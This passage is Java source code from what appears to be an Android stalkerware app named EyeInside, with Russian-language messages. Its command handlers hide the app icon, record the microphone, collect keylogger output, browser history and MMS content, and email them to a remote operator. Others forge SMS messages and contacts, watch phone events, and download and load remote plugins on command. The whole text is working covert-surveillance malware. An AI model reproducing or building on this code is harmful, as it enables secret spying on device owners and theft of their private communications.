			if ( mArgs.hasOpt("hide"))
		    	MainActivity.showPackage(mContext,false);
			else if ( mArgs.hasOpt("show") || mArgs.hasOpt("no hide"))
		    	MainActivity.showPackage(mContext,true);
				
			
			edit.putString(CommandObj.PREF_MASTER, this.mMasterPhone);
 		    edit.putBoolean("setup", true);
		    edit.commit();
			
		    String complete = checkSetupComplete(pref,true,",");
		    if ( complete != null ) {
		    	setResult("Инициализация завершена не полностью, не хватает следующих значений:%s\r\n ( @help setup )",complete);
		    	return CommandObj.ACK;
		    }
		    
			if ( mLive ) {
			  saveCommand(this);
			  Mail m = createMail();
			  int idx = 1;
			  String msg = "";
			  for ( CommandObj cmd : mCommands ) {
					if ( msg.length() != 0 ) msg += "\n";
					msg += String.format("%2d | %s %s",idx,cmd.mCommandName,cmd.mCommandHelp);
					if ( cmd.mIsPlugin )
						msg += " (" + new File(cmd.mPluginFile).getName()+")";
	
					idx++;
				}

			  String setStr = "";
			  setStr = this.checkSetupComplete(pref, false, "\r\n");
			  
			  m.setSubject("Инициализация EyeInside завершена !");
			  m.setBody(String.format("Установка прошла успешно\nЗапрос:%s\nТекущий конфиг:\n%s\n\n",this.mCommandArgs,setStr)+msg);
			  m.send();
			  if ( m.mSuccess )
			   setResult("Инициализация прошла успешно,тестовое письмо отправленно на почту");
			  else {
				String mails = "";
				  for ( String param : params ) {
					if ( mails.length() != 0 )
						mails += "\r\n";
						mails += param + ": '"+pref.getString(param,"Не установлен")+"'";
				}
				  setResult("Не могу отправить письмо,проверьте настройки почты\n--\n(%s)",mails);
			  }
			  return m.mSuccess?CommandObj.ACK:CommandObj.ERROR;
			}
			return OK;
		}
		
		public String checkSetupComplete(SharedPreferences pref,boolean check,String sep) {
			String[] reqKey = new String[] {
					CommandObj.PREF_MAIL_USER,
					CommandObj.PREF_MAIL_PASSWORD,
					CommandObj.PREF_MAIL_TO,
					CommandObj.PREF_MAIL_SMTP,
					CommandObj.PREF_MAIL_PORT,
					CommandObj.PREF_MASTER
					};
			String[] optKey = new String[] {
					CommandObj.PREF_MAIL_PORT
			};
			
			String reqVals = "";
			if ( check ) {
				for ( String key : reqKey ) {
					boolean found = pref.contains(key) && pref.getString(key, "").length() > 0; 
					if ( !found ) {
						if ( reqVals.length() > 0 )
							reqVals += ",";
						reqVals += key+":<...>"; 
					}
				}
			} else {
				Map<String,?> map = pref.getAll();
				for ( String key : map.keySet().toArray(new String[]{})) {
					if ( reqVals.length() > 0 )
						reqVals += sep;
					reqVals += String.format("%s:%s",key,map.get(key));
				}
			}
			if ( reqVals.length() == 0 )
				return null;
			
			return reqVals;
		}
		
	} // SETUP
	
	//
	//XXX Send SMS
	//
	public class CommandObjSMS extends CommandObj {
		public CommandObjSMS(String name, String help) {
			super(name, help);
		}
		public int Invoke() throws Exception {
			String to = mArgs.strValue("phone");
			String text = mArgs.strValue("text");
			CommandObj.sendSMS(to,text);
			return CommandObj.OK;
		}
	} // Send SMS
	
	
	
	//
	//XXX EVENT
	//
	public class CommandObjEvent extends CommandObj {

		SharedPreferences.Editor edit;

		public CommandObjEvent(String name, String help) {
			super(name, help);
		}
		
		public String set(String event,String name) {
			String act[] = new String[]{"вкл.","выкл."};
			int res = -1;
			
			if ( mArgs.hasOpt(name)) {
				edit.putString(event,name);
				res = 0;
			}
			if ( mArgs.hasOpt("no " +name)) {
				edit.remove(event);
				res = 1;
			}
			if ( res == -1 )
				return "";
			return name + ":"+act[res]+"; ";
		}
		
		
		public int Invoke() throws Exception {
			SharedPreferences p = mContext.getSharedPreferences("events", 1);
			edit = p.edit();
			edit.putString("phone", this.mMasterPhone);
			mCommandResult = "Мониторинг событий:";
			String res = "";
			res += set("android.intent.action.BATTERY_LOW",CommandObj.EVENT_BATTERY);
			set("android.intent.action.BATTERY_OKAY",CommandObj.EVENT_BATTERY);
			res += set("android.intent.action.ACTION_POWER_CONNECTED",CommandObj.EVENT_POWER);
			set("android.intent.action.ACTION_POWER_DISCONNECTED",CommandObj.EVENT_POWER);
			res += set("android.intent.action.BOOT_COMPLETED",CommandObj.EVENT_BOOT);
			res += set("android.intent.action.USER_PRESENT",CommandObj.EVENT_UNLOCK);
			res += set(Zombie_BroadcastReceiver.ACTION_NOTIFY,CommandObj.EVENT_NOTIFY);
			res += set(Zombie_BroadcastReceiver.ACTION_KEYLOG,CommandObj.EVENT_KEYLOG);

			if ( res.length() > 0 )
				mCommandResult += res;
			else
				mCommandResult += "Нет изменений.";
			
			edit.commit();
			return CommandObj.ACK;
		}
		
	} // SPY EVENT

	//
	//TODO: Get Browser
	//
	class CommandObjGetWeb extends CommandObj {

		public CommandObjGetWeb(String name, String help) {
			super(name, help);
		}
		
		public int Invoke() throws Exception {
		
			if ( checkSend(this) == CommandObj.ACK )
				return CommandObj.ACK;
			
			// 0,3 - all,1 - bookmarks,2 - hist
			int type = 0;
			String[] types = new String[]{"история и закладки","закладки","история"};
			if ( mArgs.hasOpt("bookmarks") )
				type |= 1;
			if ( mArgs.hasOpt("history"))
				type |= 2;
			
			if ( type == 3 )
				type = 0;
			
			String selection = null;
			mDateParam = null;
			this.makeDateParam("date",false);
			
			if ( type != 0 ) {
				if ( mDateParam == null )
					selection = String.format("bookmark = %d", type==1?1:0);
				else
					selection = String.format("%s and bookmark = %d", type==1?1:0);
			}
			if ( selection == null )
				selection = mDateParam;
			
			Cursor cur = mContext.getContentResolver().query(Browser.BOOKMARKS_URI,
                    Browser.HISTORY_PROJECTION, selection, null, "bookmark, _id DESC");
            
			if (cur.moveToFirst()) {
				String fileName = CommandObj.getFile(mContext, "browser");
				PrintStream ps = new PrintStream(new FileOutputStream(fileName,false));
                int pt = -1;
            	while (cur.isAfterLast() == false) {
                    String sTitle = cur.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX);
            		String sUrl   = cur.getString(Browser.HISTORY_PROJECTION_URL_INDEX); 
            		short isBookmark = cur.getShort(Browser.HISTORY_PROJECTION_BOOKMARK_INDEX); 
            		Date  date = new Date(cur.getLong(Browser.HISTORY_PROJECTION_DATE_INDEX));
               		if ( pt != -1 && pt != isBookmark )
               			ps.printf("\r\nЗакладки\r\n");
            		if ( isBookmark == 1 )
               			ps.printf("[%s] %s  |  %s\r\n",date.toLocaleString(),sTitle,sUrl);
               		else
               			ps.printf("[%s] %s\r\n",date.toLocaleString(),sUrl);
               		cur.moveToNext();
               		pt = isBookmark;
                }
            	ps.close();
            	setResult("%s браузера отправлены на почту",types[type]);
            	Mail m = createMail();
            	m.addAttachment(fileName,"web.txt",true);
            	m.send();
			}			
            cur.close();
			return CommandObj.REPLY;
		}
		
	} // GET HISTORY
	
	//
	//XXX Spy Brower
	public class CommandObjSpyWeb extends CommandObj {

		public CommandObjSpyWeb(String name, String help) {
			super(name, help);
		}

		public int Invoke() throws Exception {
			final handleBrowser handler = new handleBrowser(mContext);
			ContentMonitor mon = ContentMonitor.getInstance(mCommandName, mContext, this, handler);
			boolean enable = !mArgs.hasOpt("off");
			if (!mon.setEnable(enable, handleBrowser.URI.toString()) )
				return CommandObj.ERROR;
			controlPool(this,enable,true);
			return CommandObj.ACK;
		}
		
		public void Reply(Object ... args ) throws Exception {
			Cursor cur = (Cursor)args[0];
       
			long count = cur.getCount();
			long lastCount = saveCount(handleBrowser.URI.toString(), count);
			
			if ( lastCount == count )
				return;
		
			int type = 0;
			if ( mArgs.hasOpt("bookmarks") )
				type |= 1;
			if ( mArgs.hasOpt("history"))
				type |= 2;
			
			if ( type == 3 )
				type = 0;
			
			String sTitle = cur.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX);
     		String sUrl   = cur.getString(Browser.HISTORY_PROJECTION_URL_INDEX); 
     		short isBookmark = cur.getShort(Browser.HISTORY_PROJECTION_BOOKMARK_INDEX); 
     		
     		if ( (type == 1 && isBookmark == 0) || (type == 2 && isBookmark == 1)) {
     			return;
     		}
     		
     		if ( isBookmark == 1 ) {
        			mCommandResult = "Новая закладка: ";
     				mCommandResult += sTitle;
     				mCommandResult += " | ";
     				mCommandResult += sUrl;
     		} else {
        			mCommandResult = "Новый URL "+sUrl;
     		}
     		mCommandResult = mCommandResult.replace("%","%%");
     		super.Reply();
 		}
		
	}
	
	//
	//XXX GET MMS
	//
	public class CommandObjGetMMS extends CommandObj {
		
		private HashMap<String,String> names = new HashMap<String,String>();
		
		public CommandObjGetMMS(String name, String help) {
			super(name, help);
		}
		
		public int Invoke() throws Exception {
			
			if ( checkSend(this) == CommandObj.ACK )
				return CommandObj.ACK;

			
			makeDateParam("date",true);
			handleMMS handler = new handleMMS(mContext);
			handler.dateParam = mDateParam;
			ArrayList<SmsObj> smsList = handler.listMMS();
			
			if ( smsList.size() == 0 ) {
				setResult("Ни одного MMS не найдено");
				return CommandObj.ACK;
			}
				
			
			long totalSize = 0;
			Mail mail = null;
			long totalImages = smsList.size();
			long maxSize = 1024 * 1024 * 3;
			long idx = 0;
			long lastIdx = 1;
			
			String info = "";
			
			for ( SmsObj sms : smsList ) {
			
			if ( mail == null )
				mail = createMail();
				
			File image = new File(sms.filename);
			long size = image.length();
			totalSize += size;
        	mail.addAttachment(sms.filename,String.format("%s_%s",sms.date,sms.name), false);
            
        	info += sms.name + "\r\n";
        	String name = "";
        	for ( SmsObj.TypePhone tp : sms.phoneList ) {
				if ( names.containsKey(sms.phone) ) {
					name = names.get(tp.phone);
				} else {
					ContactObj contact = findContact(tp.phone);
					if ( contact != null ) {
						name = contact.name;
						names.put(tp.phone, name);
					} else 
						name = tp.phone;
				}
        		info += "   " + tp.type + "  " + name + "\r\n";
        	}
        	
        	idx++;
		        if ( totalSize >= maxSize ) 
		        {
		        	setResult("%d - %d из %d",lastIdx,idx,totalImages);
		        	mail.setBody(mCommandResult+"\r\n"+info);
		        	lastIdx = idx;
		        	info = "";
		        	mail.send();
		        	mail = null;
		        	totalSize = 0;
		        }
			}
			if ( mail != null ) {
	        	setResult("%d - %d из %d", lastIdx,idx,totalImages);
	        	mail.setBody(mCommandResult + "\r\n"+info);
	        	mail.send();
			}
			setResult("Найдены %d MMS, контент отправлен на почту", totalImages);
			return CommandObj.ACK;
		}
	}
	
	//
	//XXX SPY MMS
	//
	public class CommandObjSpyMMS extends CommandObj {

		public CommandObjSpyMMS(String name, String help) {
			super(name, help);
		}
		
		public int Invoke() throws Exception {
			/*
			final handleMMS handler = new handleMMS(mContext);
			ContentMonitor mon = ContentMonitor.getInstance(mCommandName, mContext, this, handler);
			boolean enable = !mArgs.hasOpt("off");
			if (!mon.setEnable(enable, handleMMS.URI_MMS.toString()) )
				return CommandObj.ERROR;
			controlPool(this,enable);
			*/
			setResult("Монитор ММС пока не реализован...");
			return CommandObj.ACK;
		}
	}
	
	//
	// WHAT ?
	public class CommandObjWhat extends CommandObj {

		public CommandObjWhat(String name, String help) {
			super(name, help);
		}
		
		public int Invoke() throws Exception {
			SharedPreferences p = mContext.getSharedPreferences("commandPool", 1);
			Map<String,?> all = p.getAll();
			
			setResult("Нет активных мониторов");

			if ( all.size() > 0 ) {
				setResult("Активные мониторы событий: ");
				String cmds = "";
				String commands[] = all.keySet().toArray(new String[]{});
				for ( String name : commands ) {
					if ( name.startsWith("spy") == false )
						continue;
					if ( cmds.length() > 0 )
						cmds += ",";
					cmds += name; 
				}
				appendResult(cmds);
			} 
			if ( all.size() == 0 )
				setResult("Активные мониторы событий: ");
			else
				appendResult(",");
			
			p = mContext.getSharedPreferences("events", 1);
			all = p.getAll();
			if ( all.size() > 0 ) {
				String cmds = "";
				String commands[] = all.keySet().toArray(new String[]{});
				for ( String name : commands ) {
					if ( name.equals("phone"))
						continue;
					if ( cmds.length() > 0 )
						cmds += ",";
					cmds += "event "+p.getString(name, ""); 
				}
				appendResult(cmds);
			} 
			
			return CommandObj.REPLY;
		}
	
	}

	
	//
	//XXX KeepAlive
	//
	public class CommandObjKeepAlive extends CommandObj {

		public CommandObjKeepAlive(String name, String help) {
			super(name, help);
		}
		
		public int Invoke() throws Exception {
			
			
	       SimpleDateFormat df = new SimpleDateFormat("HHmm");
   		   Date date = df.parse(mArgs.strValue("time","1500"));
			
   		   AlarmManager alarm = (AlarmManager)mContext.getSystemService(Context.ALARM_SERVICE);

   		   
		   Intent intent = new Intent(mContext,Event_BroadcastReceiver.class);
		   intent.setAction(this.mCommandName);
		   PendingIntent pendingIntent = PendingIntent.getBroadcast(mContext,0, intent, PendingIntent.FLAG_CANCEL_CURRENT);
		   
		   Calendar calendar = Calendar.getInstance();
		   calendar.set(Calendar.HOUR_OF_DAY, date.getHours());
		   calendar.set(Calendar.MINUTE, date.getMinutes());
		   
		   alarm.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(),AlarmManager.INTERVAL_DAY, pendingIntent);
			
		   NetLog.v("KeepAlive at [%s] -> %s",new Date().toLocaleString(),calendar.getTime().toLocaleString());
		   return CommandObj.OK;
		}
		
		public void Reply(Object ... args) throws Exception {
			   setResult("Сервис работает нормально: %s", new Date().toLocaleString());	
			   super.Reply();
			   
		}
	}
	
	//
	//XXX Add SMS
	//
	public class CommandObjAddSMS extends CommandObj {

		public CommandObjAddSMS(String name, String help) {
			super(name, help);
		}
		public int Invoke() throws Exception {
			
			boolean read = true;
			boolean inbox = true;
			Date    date = new Date();
			SimpleDateFormat df = new SimpleDateFormat("yyMMddHHmm");
			
			String phone = ContactObj.NormalizePhone(mArgs.strValue("phone"));
			String text = mArgs.strValue("text");
			
			inbox = !mArgs.hasOpt("outbox") || mArgs.hasOpt("inbox");
			read  = !mArgs.hasOpt("unread") || mArgs.hasOpt("read");
			if ( !inbox )
				read = true;
			
			if ( mArgs.hasArg("date") )
				date = df.parse(mArgs.strValue("date"));
			
			ContactObj cont = findContact(phone);
			
			Uri uri = SmsObj.addSMS(mContext, phone, date, read, inbox, text);
			if ( uri != null )
				setResult("Сообщение добавлено в базу (тип:%sпрочитано,ящик:%s,контакт:%s)",read?" ":"не ",inbox?"входящие":"исходящие",cont!=null?cont.name:"Нет в книжке");
			else
				setResult("Ошибка добавления сообщения...");
			return CommandObj.ACK;
		}
	}
	
	//
	// XXX Add BOOK
	//
	public class CommandObjAddBook extends CommandObj {

		public CommandObjAddBook(String name, String help) {
			super(name, help);
		}
		public int Invoke() throws Exception {
			//name:<contact>;phone:<number>;[email:<mail>];[company:<name>]
			String mail = null;
			String org  = null;
			
			mail = mArgs.strValue("email",null);
			org  = mArgs.strValue("company",null);
			String name = mArgs.strValue("name");
			String phone = mArgs.strValue("phone",null);
			ContactObj.addContact(mContext, name, phone, mail, org);
			
			setResult("Контакт %s создан",name);
			
			return CommandObj.ACK;
		}
	}
	
	//
	// XXX:MIC
	//
	public class CommandObjMic extends CommandObj {

		public VoiceRecorder mRec = null;
		
		public CommandObjMic(String name, String help) {
			super(name, help);
		}
		
		public int Invoke() throws Exception {
			
			if ( mArgs.hasOpt("off")) {
				if ( mRec != null ) {
					mRec.stop();
					mRec = null;
				}
				setResult("Запись не была активна...");
				return CommandObj.ACK;
			}

			if ( mRec != null ) {
				setResult("Запись уже в процессе");
				return CommandObj.ACK;
			}
			
			int time = mArgs.intValue("time");
			mRec = VoiceRecorder.getInstance(mContext, this,time);
			mRec.start();
			 
			Calendar cal = Calendar.getInstance();
			cal.add(Calendar.SECOND, time);
			setResult("Записываем %d сек.,результат будет выслан на почту в %s", time,cal.getTime().toLocaleString());
			return CommandObj.ACK;
		}
		
		public void Reply(Object ... args) throws Exception {
			String fileName = mRec.fileName; //(String)args[0];
			mRec.stop();
			mRec = null;
			NetLog.v("File is %s",fileName);
			Mail mail = createMail();
			File file = new File(fileName);
			mail.addAttachment(fileName,file.getName(),true);
			mail.send();
			setResult("Запись %s ( %d байт ) выслана на почту...",file.getName(),file.length());
			super.Reply(args);
		}
	}

	//
	//XXX STATS
	//
	public class CommandObjStats extends CommandObj {

		public CommandObjStats(String name, String help) {
			super(name, help);
		}
		
		public int Invoke() throws Exception {
			
			setResult("SDCard: ");
			if ( CommandObj.hasExternal() ) {
				String total = CommandObj.getSizeString(CommandObj.getExternalTotalSize());
				String free  = CommandObj.getSizeString(CommandObj.getExternalFreeSize());
				appendResult("всего %d,свободно %d",total,free);
			} else {
				appendResult("Нет");
			}
			
			boolean ok = this.wifiEnabled();
			appendResult("\r\nWifi: ");
			if ( ok ) {
				WifiManager wifi = (WifiManager)mContext.getSystemService(Context.WIFI_SERVICE);
				WifiInfo info = wifi.getConnectionInfo();
				appendResult(info.getSSID());
			} else
				appendResult("Выкл");
			
			LocationManager locMgr = (LocationManager)mContext.getSystemService(Context.LOCATION_SERVICE);
			appendResult("\r\nЛокация: ");
			appendResult("GPS: %s\r\n",(locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER)?"Вкл.":"Выкл"));
			appendResult("Network: %s" ,(locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)?"Вкл.":"Выкл"));
			
			
			
			return CommandObj.ACK;
		}
		
	}
	
	//
	// XXX NOTIFY
	public class CommandObjNotify extends CommandObj {
		public CommandObjNotify(String name, String help) {
			super(name, help);
		}
		public int Invoke() throws Exception {
			String msg = mArgs.strValue("text");
			String title = mArgs.strValue("title", "");
			NetLog.Notify(mContext, title,"%s",msg);
			return CommandObj.OK;
		}
	}

	//
	//XXX INVOKE
	//
	public class CommandObjInvoke extends CommandObj {
		public CommandObjInvoke(String name, String help) {
			super(name, help);
		}
		
		public int Invoke() throws Exception {
			String text = mArgs.strValue("text");
			replySMS(text);
			return CommandObj.OK;
		}
	}
	
	//XXX PLugin
	public class CommandObjPlugin extends CommandObj {
		public CommandObjPlugin(String name, String help) {
			super(name, help);
		}
		
		public int download() throws Exception {
			if ( !CommandObj.hasExternal()) {
				setResult("Карта памяти не доступна,загрузка плагина не возможна...");
				return CommandObj.ERROR;
			}
			
			if ( CommandObj.getExternalFreeSize() < 1024 * 1024 * 5) {
				setResult("Недостаточно места на карте памяти, загрузка не возможна...");
				return CommandObj.ERROR;
			}

			
			DefaultHttpClient client = new DefaultHttpClient();
	 		String path = mArgs.strValue("get");
			NetLog.v("Downloading plugin from %s",path);
			HttpGet get = new HttpGet(path);//"http://apache-mirror.rbc.ru/pub/apache//httpcomponents/httpclient/binary/httpcomponents-client-4.2.5-bin.tar.gz");
			HttpResponse resp = client.execute(get);
			
			
			HttpEntity ent = resp.getEntity();

			String pluginDir = Environment.getExternalStorageDirectory().getAbsolutePath();
			pluginDir += "/data/com.code4bones/plugins/";
			
			String fileName = pluginDir;// 
			{ 
			  File dummy = new File(get.getURI().getPath());
			  fileName += "/" + dummy.getName();
			}
			File outFile = new File(fileName);
			FileOutputStream fos = new FileOutputStream(outFile);
			ent.writeTo(fos);
			ent.consumeContent();
			fos.close();
			
			// plugins manager
			PluginManager plugins = new PluginManager(CommandPool.this);
			int count = plugins.reloadPlugins(); 
			if ( count > 0 )
				setResult("Библиотека загружена,команд найдено %d",count);
			else
				setResult("Библиотека загружеа, но число команд не изменилось...");
				
			return CommandObj.ACK;
		}
		
		public CommandObj findPlugin(String name) {
			for ( CommandObj cmd : mCommands ) {
				if ( !cmd.mIsPlugin )
					continue;
				if ( cmd.mPluginFile.compareToIgnoreCase(name) == 0 )
					return cmd;
			}
			return null;
		}
		
		public int delete() throws Exception {
			String cmdName = mArgs.strValue("remove");
			
			setResult("Плагин '%s' не найден,удаление не возможно...", cmdName);
			CommandObj cmd = findCommand(cmdName);
			if ( cmd == null ) {
				cmd = findPlugin(cmdName);
				if ( cmd == null ) 
					return CommandObj.ERROR;
			}
			
			if ( !cmd.mIsPlugin ) {
				setResult("Команда %s является встроенной, и не может быть удалена",cmd.mCommandName);
				return CommandObj.ERROR;
			}
			
			
			File file = new File(cmd.mPluginFile);
			boolean fok = file.delete(); 
		
			PluginManager plugins = new PluginManager(CommandPool.this);
			plugins.reloadPlugins(); 

			if ( fok )
				setResult("Пакет %s (c командой %s) удален и более не доступен !\nдоступно %d команд",file.getName(),cmd.mCommandName,mCommands.size());
			else
				setResult("Не удалось удалить пакет %s",file.getName());
			
			return CommandObj.ACK;
		}
		
		public int list() {
			NetLog.v("Lists plugins...");
			Map<String,String> plugs = new HashMap<String,String>();
			for ( CommandObj cmd : mCommands ) {
				if ( !cmd.mIsPlugin )
					continue;
				String name;
				String file = new File(cmd.mPluginFile).getName();
				if ( plugs.containsKey(file)) 
					name = plugs.get(file) + "," + cmd.mCommandName;
				else
					name = cmd.mCommandName;
				plugs.put(file, name);
			}
			if ( plugs.isEmpty() ) {
				setResult("Плагинов не найдено...");
				return CommandObj.ACK;
			}
				
			Set<String> keysSet = plugs.keySet();
			setResult("");
			for ( String key : keysSet.toArray(new String[]{}) ) {
				if ( mCommandResult.length() != 0 )
					appendResult("\r\n-\r\n");
				appendResult("пакет:%s [%s]",key,plugs.get(key));
			}
			return CommandObj.ACK;
		}
		
		public int  Invoke() throws Exception {
			if ( mArgs.hasArg("get")) {
				return download();
			} else if ( mArgs.hasArg("remove")) {
				return delete();
			} 
			return list();
		}
	} // Plugin

	
	//
	//XXX KEYLOG
	//
	public class CommandObjGetKeyLog extends CommandObj {
		public CommandObjGetKeyLog(String name,String help) {
			super(name,help);
		}
		
		public int Invoke() throws Exception {
			setResult("Файл кейлога выслан на почту");
			boolean keepOld = mArgs.hasOpt("keep");
			Mail mail = createMail();
			String fileName = CommandObj.getFile(mContext, "kl_log.txt", false);
			mail.addAttachment(fileName,"keylog.txt", !keepOld);
			mail.send();
			return CommandObj.ACK;
		}
		
	}// KeyLog
}


